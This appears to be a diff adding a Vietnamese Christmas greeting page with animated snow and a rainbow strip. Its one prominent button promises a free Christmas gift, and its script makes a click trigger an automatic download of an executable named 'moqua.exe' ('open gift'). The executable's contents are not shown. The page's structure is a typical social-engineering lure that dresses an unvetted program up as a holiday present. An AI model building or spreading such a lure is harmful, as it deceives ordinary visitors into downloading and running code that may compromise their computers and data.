@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="vn">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        @keyframes moveButton {
+            0% {
+                transform: translateY(0);
+            }
+
+            50% {
+                transform: translateY(-10px);
+            }
+
+            100% {
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes snowFall {
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+
+            50% {
+                transform: translateY(5px);
+            }
+        }
+
+        @keyframes rainbowBlink {
+            0%,
+            100% {
+                opacity: 0.5;
+            }
+
+            50% {
+                opacity: 1;
+            }
+        }
+
+        html,
+        body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+            font-family: sans-serif;
+            user-select: none;
+            overflow: hidden;
+        }
+
+        body {
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        .background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://source.unsplash.com/1920x1080/?christmas') no-repeat center center fixed;
+            background-size: cover;
+            z-index: 0;
+        }
+
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            background: linear-gradient(to bottom, rgba(0, 0, 0, 0) 0%, rgba(0, 0, 0, 0.5) 50%, rgba(0, 0, 0, 0.8) 100%);
+        }
+
+        img {
+            max-width: 100%;
+            margin-bottom: 20px;
+            z-index: 2;
+        }
+
+        .animated-button {
+            position: relative;
+            z-index: 3;
+            display: inline-block;
+            padding: 10px 20px;
+            font-size: 18px;
+            text-align: center;
+            text-decoration: none;
+            cursor: pointer;
+            background-color: #c0392b;
+            color: #ffffff;
+            border-radius: 5px;
+            animation: moveButton 2s infinite, blinkButton 2s infinite;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
+        }
+
+        .animated-button:hover {
+            background-color: #a93226;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 1);
+        }
+
+        .snowflake {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background: #fff;
+            clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
+            animation: snowFall 1s infinite;
+        }
+
+        .rainbow-strip {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 10px;
+            background: linear-gradient(to right, violet, indigo, blue, green, yellow, orange, red);
+            z-index: 2;
+            animation: rainbowBlink 2s infinite;
+        }
+
+        @keyframes rainbowBlink {
+            0%,
+            100% {
+                opacity: 0.5;
+            }
+
+            50% {
+                opacity: 1;
+            }
+        }
+
+        .rainbow-strip.rainbow-on {
+            animation: none;
+            background: violet; /* Change to the color of the LED when it's on */
+        }
+
+        /* Generate snowflakes dynamically */
+        .snow-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+        }
+
+        .snow-container .snowflake {
+            animation-delay: calc(-1s * var(--delay));
+            animation-duration: calc(2s * var(--delay));
+        }
+    </style>
+    <title>Merry Christmas 2023</title>
+</head>
+
+<body>
+    <div class="background"></div>
+    <div class="overlay"></div>
+    <div class="rainbow-strip"></div>
+    <div class="snow-container">
+        <!-- Generate multiple snowflakes -->
+        <div class="snowflake" style="--delay: 0;"></div>
+        <div class="snowflake" style="--delay: 1;"></div>
+        <div class="snowflake" style="--delay: 2;"></div>
+        <!-- Add more as needed -->
+    </div>
+    <a href="#" class="animated-button">NHẬN QUÀ GIÁNG SINH NGAY !!</a>
+    <div>
+        <img src="https://via.placeholder.com/400" alt="Image"> <!-- Placeholder image, replace with your own -->
+    </div>
+    <script>
+        const button = document.querySelector(".animated-button");
+
+        button.addEventListener("click", function() {
+            const downloadUrl = "/moqua.exe";
+            const a = document.createElement("a");
+            a.href = downloadUrl;
+            a.download = "moqua.exe";
+            a.click();
+        });
+
+        const rainbowStrip = document.querySelector(".rainbow-strip");
+
+        setInterval(() => {
+            rainbowStrip.classList.toggle("rainbow-on");
+        }, 2000);
+    </script>
+</body>
+
+</html>
